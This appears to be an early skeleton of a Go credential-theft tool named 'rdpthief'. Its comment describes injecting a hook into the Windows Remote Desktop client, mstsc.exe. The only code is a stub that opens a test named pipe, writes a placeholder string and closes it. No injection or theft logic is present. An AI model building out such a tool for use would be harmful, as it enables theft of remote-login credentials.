package rdpthief

import (
	"time"

	"github.com/Microsoft/go-winio"
)

// Server is used to watch process list and inject hook
// to the new created process ("mstsc.exe").
type Server struct {
}

func Listen() {
	listener, _ := winio.ListenPipe(`\\.\pipe\test`, nil)

	go func() {
		listener.Accept()
	}()

	conn, _ := winio.DialPipe(`\\.\pipe\test`, nil)
	conn.Write([]byte("asd"))

	time.Sleep(time.Minute)

	conn.Close()
}
